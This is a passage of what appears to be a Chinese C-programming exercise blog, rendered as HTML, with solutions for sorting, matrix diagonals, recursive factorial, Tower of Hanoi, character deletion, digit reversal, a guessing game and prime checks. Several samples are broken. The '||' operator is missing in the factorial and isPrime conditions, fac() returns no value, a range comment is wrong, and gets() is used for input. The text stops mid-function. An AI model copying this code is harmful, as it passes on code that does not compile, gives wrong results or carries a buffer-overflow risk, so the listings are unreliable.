i,j,a[10],t;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    for(j=1;j&lt;10;j++)&#123;</span><br><span class="line">        for(i=0;i&lt;10-j;i++)&#123;</span><br><span class="line">            if(a[i]&gt;a[i+1])&#123;</span><br><span class="line">                t = a[i];</span><br><span class="line">                a[i] = a[i+1];</span><br><span class="line">                a[i+1] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        printf(&quot;%5d&quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define N 10</span><br><span class="line"></span><br><span class="line">void sort(int array[],int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a[N];</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,N);</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        printf(&quot;%d &quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sort(int array[],int n)&#123;</span><br><span class="line">    int i,j,k,t;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;</span><br><span class="line">        k = i;</span><br><span class="line">        for(j=i+1;j&lt;n;j++)&#123;</span><br><span class="line">            if(array[j]&lt;array[k])&#123;</span><br><span class="line">                k = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        t = array[k];</span><br><span class="line">        array[k] = array[i];</span><br><span class="line">        array[i] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="025-对角线元素之和"><a href="#025-对角线元素之和" class="headerlink" title="025 对角线元素之和"></a>025 对角线元素之和</h2><p>【题目】求一个3×3矩阵对角线元素之和</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,j,a[3][3],s1,s2;</span><br><span class="line">    for(i=0;i&lt;3;i++)&#123;</span><br><span class="line">        for(j=0;j&lt;3;j++)&#123;</span><br><span class="line">            scanf(&quot;%d&quot;,&amp;a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    s1 = a[0][0] + a[1][1] + a[2][2];</span><br><span class="line">    s2 = a[0][2] + a[1][1] + a[2][0];</span><br><span class="line">    printf(&quot;s1 = %d, s2 = %d\n&quot;,s1,s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="026-用递归方法求-n！"><a href="#026-用递归方法求-n！" class="headerlink" title="026 用递归方法求 n！"></a>026 用递归方法求 n！</h2><p>【题目】用递归方法求 n！</p><p>【思路】</p><p><img src="https://gitee.com/wugenqiang/PictureBed/raw/master/CS-Notes/20200423171925.png" alt="image-20200318165046564" title="image-20200318165046564"></p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int fac(int n); </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int y;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    y = fac(n);</span><br><span class="line">    printf(&quot;%d!=%d\n&quot;,n,y);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fac(int n)&#123;</span><br><span class="line">    int f;</span><br><span class="line">    if(n&lt;0)&#123;</span><br><span class="line">        printf(&quot;n&lt;0,data error!&quot;);</span><br><span class="line">    &#125;else if(n==0n==1)&#123;</span><br><span class="line">        f = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        f = fac(n-1)*n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="027-Hanoi-汉诺-塔问题"><a href="#027-Hanoi-汉诺-塔问题" class="headerlink" title="027 Hanoi(汉诺)塔问题"></a>027 Hanoi(汉诺)塔问题</h2><p>【题目】</p><p><img src="https://gitee.com/wugenqiang/PictureBed/raw/master/CS-Notes/20200423171937.png" alt="image-20200318170450483" title="image-20200318170450483"></p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void hanoi(int n,char one,char two,char three);</span><br><span class="line">void move(char x,char y);</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    int m;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line">    hanoi(m,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hanoi(int n,char one,char two,char three)&#123;</span><br><span class="line">    if(n == 1)&#123;</span><br><span class="line">        move(one,three);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        hanoi(n-1,one,three,two);</span><br><span class="line">        move(one,three);</span><br><span class="line">        hanoi(n-1,two,one,three);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void move(char x,char y)&#123;</span><br><span class="line">    printf(&quot;%c-&gt;%c\n&quot;,x,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="028-数组输出元素"><a href="#028-数组输出元素" class="headerlink" title="028 数组输出元素"></a>028 数组输出元素</h2><p>【题目】输入10个数，要求输出其中值最大的元素和该数是第几个数。</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define N 10</span><br><span class="line"></span><br><span class="line">int max(int x,int y);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a[N];</span><br><span class="line">    int i,t,number = 0;</span><br><span class="line">    printf(&quot;enter 10 integer numbers：&quot;);</span><br><span class="line">    for(i=0;i&lt;N;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    t = a[0];</span><br><span class="line">    for(i=1;i&lt;N;i++)&#123;</span><br><span class="line">        if(max(t,a[i])&gt;t)&#123;</span><br><span class="line">            t = max(t,a[i]);</span><br><span class="line">            number = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;The largest number is %d\nit is the %d number.\n&quot;,t,number+1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int max(int x,int y)&#123;</span><br><span class="line">    return x&gt;y?x:y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="029-删除字符串中指定字符"><a href="#029-删除字符串中指定字符" class="headerlink" title="029 删除字符串中指定字符"></a>029 删除字符串中指定字符</h2><p>【题目】有一个字符串，内有若干个字符，现输入一个字符，要求程序将字符串中该字符删去。</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define N 80</span><br><span class="line"></span><br><span class="line">void enterString(char str[]);</span><br><span class="line">void deleteString(char str[],char ch);</span><br><span class="line">void printString(char str[]);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c,str[N];</span><br><span class="line">    enterString(str);</span><br><span class="line">    scanf(&quot;%c&quot;,&amp;c);  //要求删的字符</span><br><span class="line">    deleteString(str,c);</span><br><span class="line">    printString(str); </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void enterString(char str[])&#123;</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deleteString(char str[],char ch)&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i=0,j=0;str[i]!=&#x27;\0&#x27;;i++)&#123;</span><br><span class="line">        if(str[i]!=ch)&#123;</span><br><span class="line">            str[j++] = str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    str[j] = &#x27;\0&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void printString(char str[])&#123;</span><br><span class="line">    printf(&quot;%s\n&quot;,str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="030-指针访问整型变量"><a href="#030-指针访问整型变量" class="headerlink" title="030 指针访问整型变量"></a>030 指针访问整型变量</h2><p>【题目】通过指针变量访问整型变量</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a = 100;</span><br><span class="line">    int *p;</span><br><span class="line">    p = &amp;a;</span><br><span class="line">    printf(&quot;*p = %d\n&quot;,*p);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="031-逆序的三位数"><a href="#031-逆序的三位数" class="headerlink" title="031 逆序的三位数"></a>031 逆序的三位数</h2><p>【题目】</p><p>程序每次读入一个正三位数，然后输出逆序的数字。</p><p>注意，当输入的数字含有结尾的 0 时，输出不应带有前导的 0 。比如输入 700 ，输出应该是 7 。</p><p>提示：用 %10 可以得到个位数，用 &#x2F;100 可以得到百位数…。将这样得到的三个数字合起来：百位 <em>100 + 十位</em> 10 + 个位，就得到了结果。</p><p>【输入格式】</p><p>每个测试是一个3位的正整数。</p><p>【输出格式】</p><p>输出逆序的数。</p><p>【输入样例】</p><p>123</p><p>【输出样例】</p><p>321</p><p>【时间限制】</p><p>500ms内存限制：32000kb</p><p>【参考代码】</p><ul><li>C 版</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int t1,t2,mt1,mt2,mt3;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;t1);    //输入</span><br><span class="line">     </span><br><span class="line">    mt1=t1/100; mt2=(t1-mt1*100)/10; mt3=t1%10;</span><br><span class="line">    t2=mt3*100+mt2*10+mt1;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d\n&quot;,t2);    //输出</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="032-数位数"><a href="#032-数位数" class="headerlink" title="032 数位数"></a>032 数位数</h2><ul><li><p>Example 01：先判断后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int x;</span><br><span class="line">  int count = 0;</span><br><span class="line">  </span><br><span class="line">  printf(&quot;请输入一个任意数：&quot;); </span><br><span class="line">  scanf(&quot;%d&quot;,&amp;x); </span><br><span class="line">  </span><br><span class="line">  count++;</span><br><span class="line">  x /= 10;</span><br><span class="line">  while(x &gt; 0)</span><br><span class="line">  &#123;</span><br><span class="line">      count++;</span><br><span class="line">      x /= 10;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  printf(&quot;该数有 %d 位！\n&quot;,count);</span><br><span class="line">  </span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Example 02：先执行后判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">//数位数 </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int x;</span><br><span class="line">  int count = 0;</span><br><span class="line">  </span><br><span class="line">  printf(&quot;请输入一个任意数：&quot;); </span><br><span class="line">  scanf(&quot;%d&quot;,&amp;x); </span><br><span class="line">  </span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">      x /= 10;</span><br><span class="line">      count++;</span><br><span class="line">  &#125;while(x&gt;0);</span><br><span class="line">  </span><br><span class="line">  printf(&quot;该数有 %d 位！\n&quot;,count);</span><br><span class="line">  </span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="033-求阶乘n！"><a href="#033-求阶乘n！" class="headerlink" title="033 求阶乘n！"></a>033 求阶乘n！</h2><p>【题目】写一个程序，让用户输入n,然后计算输出n!<br>【代码】</p><ul><li><code>Example 01：</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">//求阶乘n！ </span><br><span class="line">//题目：写一个程序，让用户输入n,然后计算输出n! </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int i=1;</span><br><span class="line">    int fact = 1;//阶乘 </span><br><span class="line">    </span><br><span class="line">    printf(&quot;请输入一个任意数n：&quot;); </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n); </span><br><span class="line">    </span><br><span class="line">/*    while(i&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        fact *= i; </span><br><span class="line">        i++;</span><br><span class="line">    &#125;*/</span><br><span class="line">    for(i=2;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fact *= i; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d!= %d\n&quot;,n,fact);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>Example 02:</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int i=1;</span><br><span class="line">    int fact = 1;//阶乘 </span><br><span class="line">    </span><br><span class="line">    printf(&quot;请输入一个任意数n：&quot;); </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n); </span><br><span class="line">    </span><br><span class="line">    for(i=n;i&gt;1;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        fact *= i; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d!= %d\n&quot;,n,fact);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="034-猜数游戏"><a href="#034-猜数游戏" class="headerlink" title="034 猜数游戏"></a>034 猜数游戏</h2><p>【题目】系统随机生成数字，猜数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    srand(time(0));</span><br><span class="line">    int number = rand()%100 + 1;//[0,100]</span><br><span class="line">    int count = 0;</span><br><span class="line">    int a = 0;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;我已经想好了一个1到100之间的数。&quot;);</span><br><span class="line">     </span><br><span class="line">    do&#123;</span><br><span class="line">        printf(&quot;请猜这个1到100之间的数：&quot;);</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">        </span><br><span class="line">        count++;</span><br><span class="line">        if(a&gt;number)&#123;</span><br><span class="line">            printf(&quot;你猜的数大了\n&quot;); </span><br><span class="line">        &#125; else if(a&lt;number)&#123;</span><br><span class="line">            printf(&quot;你猜的数小了\n&quot;); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;while(a!=number);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;太好了，你用了 %d 次就猜到了答案。\n&quot;,count);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="035-整数逆序"><a href="#035-整数逆序" class="headerlink" title="035 整数逆序"></a>035 整数逆序</h2><ul><li>跟 <code>001</code> 逻辑一样，但是这个地方用到了循环结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x,digit;</span><br><span class="line">    int result = 0;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    </span><br><span class="line">    while(x&gt;0)&#123;</span><br><span class="line">        digit = x%10;</span><br><span class="line">        result = result*10 + digit;</span><br><span class="line">        x /= 10;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d&quot;,result);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="036-判断素数"><a href="#036-判断素数" class="headerlink" title="036 判断素数"></a>036 判断素数</h2><ul><li><code>Example 01</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    int i;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    </span><br><span class="line">    for(i=2;i&lt;x;i++)&#123;</span><br><span class="line">        if(x%i == 0)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(i&lt;x)&#123;</span><br><span class="line">        printf(&quot;%d 不是素数&quot;,x);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;%d 是素数&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>Example 02</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    int i;</span><br><span class="line">    int isPrime = 1;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    </span><br><span class="line">    for(i=2;i&lt;x;i++)&#123;</span><br><span class="line">        if(x%i == 0)&#123;</span><br><span class="line">            isPrime = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(isPrime == 1)&#123;</span><br><span class="line">        printf(&quot;%d 是素数&quot;,x);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;%d 不是素数&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 03：使用子函数调用的方式：去掉偶数，从3到x-1，每次加2</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int isPrime(int x)&#123;</span><br><span class="line">    int result = 1;</span><br><span class="line">    int i;</span><br><span class="line">    if(x == 1  (x%2 == 0 &amp;&amp; x != 2))&#123;</span><br><span class="line">        result = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=3;i&lt;x;i+=2)&#123;</span><br><span class="line">        if(x%i == 0)&#123;</span><br><span class="line">            result = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 04：无须到x-1，到sqrt(x)就够了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int isPrime(int x)&#123;</span><br><span class="line">    int result = 1;</span><br><span class="line">    int i;</span><br><span class="line">    if(x == 1  (x%2 == 0 &amp;&amp; x != 2))&#123;</span><br><span class="line">        result = 